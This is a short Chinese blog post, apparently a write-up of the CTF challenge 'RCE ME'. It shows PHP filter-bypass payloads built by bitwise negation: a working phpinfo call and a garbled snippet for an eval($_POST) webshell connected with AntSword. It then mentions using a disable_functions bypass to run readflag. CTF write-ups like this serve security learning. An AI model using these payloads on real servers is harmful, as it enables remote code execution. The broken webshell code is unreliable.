---
title: '[极客大挑战 2019]RCE ME'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-07-28 21:51:40
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-617631.jpg
---

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200728215504.png)

构造取反读取phpinfo

<?php
$s = 'phpinfo';
echo urlencode(~$s);
?>

payload：?code=(~%8F%97%8F%96%91%99%90)();

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200728221328.png)

构造取反连接蚁剑

<?php
a=′assert′;echourlencode( a)."\n";
b=′(eval(_POST[cmd]))';
echo urlencode(~$b)."\n";
?>

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200728225317.png)

看到根目录下存在flag和readflag文件。应该是通过执行readflag来读取flag，但是这里的shell命令基本上都被禁了。

我们可以通过蚁剑的绕过disable_functions来执行。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/afcvff.jpg)